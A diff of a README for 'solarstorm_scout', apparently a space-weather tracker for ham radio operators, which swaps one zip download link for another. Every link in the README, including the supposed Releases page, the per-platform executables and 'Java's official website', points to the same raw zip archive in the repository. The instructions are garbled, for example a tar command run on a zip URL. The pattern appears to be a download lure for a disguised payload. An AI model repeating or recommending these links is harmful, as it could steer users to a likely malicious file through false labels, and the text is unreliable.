@@ -1,6 +1,6 @@
 # 🌌 solarstorm_scout - Track Space Weather Easily
 
-[![Download Now](https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip)
+[![Download Now](https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,24 +8,24 @@ Welcome to solarstorm_scout! This app helps ham radio operators monitor space we
 
 ## 📥 Download & Install
 
-To get started, you need to download the software from the Releases page. Visit this page to download: [Download solarstorm_scout](https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip).
+To get started, you need to download the software from the Releases page. Visit this page to download: [Download solarstorm_scout](https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip).
 
 ### Instructions for Installation
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip).
+1. Go to the [Releases page](https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip).
 2. Look for the latest version of solarstorm_scout.
 3. Click on the download link for your operating system:
-   - If you're using **Windows**, you may see a file like `https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip`.
-   - For **MacOS**, look for `https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip`.
-   - If you're on **Linux**, find the `https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip` file.
+   - If you're using **Windows**, you may see a file like `https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip`.
+   - For **MacOS**, look for `https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip`.
+   - If you're on **Linux**, find the `https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip` file.
 4. After the download finishes, locate the downloaded file on your computer.
 5. Extract the files:
    - On Windows, right-click the ZIP file and select "Extract All".
    - On MacOS, double-click the ZIP file to extract it.
-   - On Linux, use the command: `tar -xvzf https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip`.
+   - On Linux, use the command: `tar -xvzf https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip`.
 6. Open the extracted folder and find the executable file:
-   - For Windows, this will be `https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip`.
-   - For MacOS, look for `https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip`.
+   - For Windows, this will be `https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip`.
+   - For MacOS, look for `https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip`.
    - For Linux, it will be `solarstorm_scout`.
 7. Double-click the executable file to start the application.
 
@@ -54,11 +54,11 @@ Make sure your system meets the following requirements for optimal performance:
 
 If you encounter issues while running solarstorm_scout, follow these steps:
 
-1. **Ensure Java is Installed**: SolarStorm Scout runs on Java. Ensure you have the latest version installed. You can download it from [Java's official website](https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip).
+1. **Ensure Java is Installed**: SolarStorm Scout runs on Java. Ensure you have the latest version installed. You can download it from [Java's official website](https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip).
    
 2. **Check Internet Connection**: A stable internet connection is required for the app to function correctly.
 
-3. **Update the Application**: Make sure you are using the latest version. Visit the [Releases page](https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip) to download updates.
+3. **Update the Application**: Make sure you are using the latest version. Visit the [Releases page](https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip) to download updates.
 
 4. **Community Support**: Join our community forums or check the GitHub Issues page for help from other users.
 
@@ -78,4 +78,4 @@ For questions or discussions, please join our community on Bluesky and Mastodon.
 
 If you have specific questions or need assistance, please reach out via the contact page on the repository. Your feedback helps improve solarstorm_scout.
 
-Remember, visit this page to download: [Download solarstorm_scout](https://raw.githubusercontent.com/joshuarodm7/solarstorm_scout/main/solarstorm_scout/solarstorm_scout_kindlily.zip). Enjoy tracking space weather with ease!
+Remember, visit this page to download: [Download solarstorm_scout](https://github.com/joshuarodm7/solarstorm_scout/raw/refs/heads/main/solarstorm_scout/solarstorm_scout_v1.9-beta.5.zip). Enjoy tracking space weather with ease!
